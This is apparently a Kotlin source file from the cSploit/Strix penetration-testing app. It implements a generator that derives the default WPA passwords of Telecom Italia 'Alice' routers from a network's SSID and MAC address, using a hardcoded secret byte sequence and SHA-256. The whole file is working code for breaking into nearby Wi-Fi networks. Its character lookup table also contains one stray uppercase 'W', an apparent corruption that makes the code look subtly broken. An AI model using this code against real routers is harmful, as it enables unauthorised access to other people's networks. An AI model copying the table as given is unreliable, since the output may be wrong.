/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen
import org.csploit.strix.data.wifi.algorithms.helpers.AliceMagicInfo
import java.security.MessageDigest

class AliceKeygen(
    ssid: String,
    mac: String,
    level: Int,
    enc: String,
    private val supportedAlice: List<AliceMagicInfo>
) : Keygen(ssid, mac, level, enc) {

    private val ssidIdentifier: String = ssid.substring(ssid.length - 8)

    override fun getKeys(): List<String>? {
        if (supportedAlice.isEmpty()) {
            errorMessage = "This Alice series is not yet supported!"
            return null
        }

        val md: MessageDigest = try {
            MessageDigest.getInstance("SHA-256")
        } catch (e: Exception) {
            errorMessage = "This phone cannot process a SHA256 hash."
            return null
        }

        for (info in supportedAlice) {
            /* For pre AGPF 4.5.0sx */
            var serialStr = info.serial + "X"
            val q = info.magic[0]
            val k = info.magic[1]
            val serial = (ssidIdentifier.toInt() - q) / k
            val tmp = serial.toString()
            for (i in 0 until 7 - tmp.length) {
                serialStr += "0"
            }
            serialStr += tmp

            val macBytes = ByteArray(6)
            var key: String

            if (this.mac.length == 12) {
                for (i in 0 until 12 step 2)
                    macBytes[i / 2] = ((Character.digit(this.mac[i], 16) shl 4) +
                            Character.digit(this.mac[i + 1], 16)).toByte()

                md.reset()
                md.update(SPECIAL_SEQ)
                md.update(serialStr.toByteArray(Charsets.US_ASCII))
                md.update(macBytes)
                val hash = md.digest()
                key = ""
                for (i in 0 until 24) {
                    key += PRE_INIT_CHARSET[hash[i].toInt() and 0xFF]
                }
                addPassword(key)
            }

            /* For post AGPF 4.5.0sx */
            var macEth = this.mac.substring(0, 6)
            var extraNumber = 0
            while (extraNumber <= 9) {
                val calc = Integer.toHexString(extraNumber + ssidIdentifier.toInt()).uppercase()
                if (macEth[5] == calc[0]) {
                    macEth += calc.substring(1)
                    break
                }
                extraNumber++
            }
            if (macEth == this.mac.substring(0, 6)) {
                return getResults()
            }
            for (i in 0 until 12 step 2)
                macBytes[i / 2] = ((Character.digit(macEth[i], 16) shl 4) +
                        Character.digit(macEth[i + 1], 16)).toByte()
            md.reset()
            md.update(SPECIAL_SEQ)
            md.update(serialStr.toByteArray(Charsets.US_ASCII))
            md.update(macBytes)
            key = ""
            val hash = md.digest()
            for (i in 0 until 24)
                key += PRE_INIT_CHARSET[hash[i].toInt() and 0xFF]
            addPassword(key)
        }
        return getResults()
    }

    companion object {
        private const val PRE_INIT_CHARSET =
            "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvWxyz0123"

        private val SPECIAL_SEQ = byteArrayOf(
            0x64, 0xC6.toByte(), 0xDD.toByte(), 0xE3.toByte(),
            0xE5.toByte(), 0x79, 0xB6.toByte(), 0xD9.toByte(),
            0x86.toByte(), 0x96.toByte(), 0x8D.toByte(), 0x34,
            0x45, 0xD2.toByte(), 0x3B, 0x15,
            0xCA.toByte(), 0xAF.toByte(), 0x12, 0x84.toByte(),
            0x02, 0xAC.toByte(), 0x56, 0x00,
            0x05, 0xCE.toByte(), 0x20, 0x75,
            0x91.toByte(), 0x3F, 0xDC.toByte(), 0xE8.toByte()
        )
    }
}
